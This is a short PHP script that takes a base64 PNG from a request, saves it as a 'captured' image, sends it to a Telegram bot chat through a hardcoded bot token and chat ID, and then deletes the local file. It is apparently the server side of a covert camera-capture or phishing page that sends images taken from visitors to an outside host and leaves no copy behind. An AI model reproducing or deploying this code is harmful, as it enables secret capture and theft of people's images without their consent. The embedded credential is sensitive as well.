<?php
$data = json_decode(file_get_contents("php://input"));
$image = $data->image;

if ($image) {
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = str_replace(' ', '+', $image);
    $fileData = base64_decode($image);

    $fileName = "captured_" . time() . ".png";
    file_put_contents($fileName, $fileData);

    // Send to Telegram
    $telegramToken = "Y7593653128:AAGTeaMtzMzjcPbfABOTZ0YlQdfEGxkvHFQ";
    $chatID = "7615485308";
    $url = "https://api.telegram.org/bot$telegramToken/sendPhoto";

    $postData = [
        'chat_id' => $chatID,
        'photo' => new CURLFile($fileName)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    unlink($fileName); // Delete the file after sending
}
?>
